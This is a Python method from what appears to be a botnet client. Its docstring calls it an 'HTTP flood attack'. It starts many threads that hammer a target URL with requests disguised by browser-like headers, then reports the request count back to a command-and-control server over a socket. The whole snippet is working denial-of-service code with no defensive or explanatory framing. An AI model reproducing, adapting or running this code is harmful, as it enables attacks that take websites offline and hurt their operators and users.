def http_flood(self, url, threads=10, duration=60):
    """Mass refresh a website - HTTP flood attack"""
    print(f"[*] Starting HTTP flood on {url} with {threads} threads for {duration}s")
    
    import urllib.request
    import urllib.error
    import threading
    
    # Add headers to look like a real browser
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    
    request = urllib.request.Request(url, headers=headers)
    end_time = time.time() + duration
    counter = 0
    errors = 0
    
    def flood_worker():
        nonlocal counter, errors
        while time.time() < end_time:
            try:
                response = urllib.request.urlopen(request, timeout=5)
                counter += 1
                response.close()
                if counter % 10 == 0:
                    print(f"[*] HTTP Flood: {counter} requests sent")
            except:
                errors += 1
                pass
    
    # Create threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    # Wait for duration
    time.sleep(duration)
    
    print(f"[*] HTTP Flood completed! Sent {counter} requests, {errors} errors")
    
    # Report back to C&C
    result = {
        'status': 'completed',
        'requests': counter,
        'errors': errors,
        'action': 'http_flood'
    }
    self.socket.send(json.dumps(result).encode('utf-8'))
